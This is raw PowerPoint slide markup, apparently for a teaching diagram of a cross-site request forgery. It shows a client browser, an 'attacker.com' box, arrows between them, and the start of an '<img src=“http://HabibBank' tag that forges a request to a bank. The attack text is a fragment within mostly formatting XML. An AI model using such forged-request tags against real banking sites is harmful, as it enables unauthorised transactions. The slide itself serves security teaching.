              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="84997" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2801471" y="2616574"/>
            <a:ext cx="1243853" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 2991 w 1821814"/>
              <a:gd name="T5" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 6483 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821230" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821230" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3151655"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2151529"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8766" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85000" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8547287" y="1638861"/>
            <a:ext cx="1818154" cy="830636"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85001" name="object 11"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1764926" cy="822232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:srgbClr val="000000"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8573901" y="1647265"/>
            <a:ext cx="1825158" cy="801310"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF2A06"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1765" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:spcBef>
                <a:spcPts val="27"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="70558" defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1765" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>attacker.com</a:t>
            </a:r>
            <a:endParaRPr sz="1765" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="14" name="Straight Arrow Connector 13"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="4090147" y="1882588"/>
            <a:ext cx="4398309" cy="987519"/>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9" name="Straight Arrow Connector 8"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4171390" y="2353236"/>
            <a:ext cx="4317066" cy="910478"/>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16" name="object 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4143376" y="2510118"/>
            <a:ext cx="4574801" cy="1591235"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="6572884" h="2263140">
                <a:moveTo>
                  <a:pt x="6389268" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="1457705"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="183616" y="2262530"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6572884" y="804824"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6389268" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
        </p:spPr>
        <p:style>
          <a:lnRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:lnRef>
          <a:fillRef idx="2">
            <a:schemeClr val="accent5"/>
          </a:fillRef>
          <a:effectRef idx="1">
            <a:schemeClr val="accent5"/>
          </a:effectRef>
          <a:fontRef idx="minor">
            <a:schemeClr val="dk1"/>
          </a:fontRef>
        </p:style>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="20880000">
            <a:off x="4406714" y="3166833"/>
            <a:ext cx="3478026" cy="192360"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr defTabSz="631080">
              <a:lnSpc>
                <a:spcPts val="1545"/>
              </a:lnSpc>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>img</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0" err="1">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1588" b="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>=“http://HabibBank</a:t>
            </a:r>
            <a:endParaRPr sz="1588" b="1" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="85007" name="object 14"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm rot="-720000">
            <a:off x="4462743" y="3282986"/>
            <a:ext cx="4416519" cy="205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714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600" defTabSz="714375">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" defTabSz="714375" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
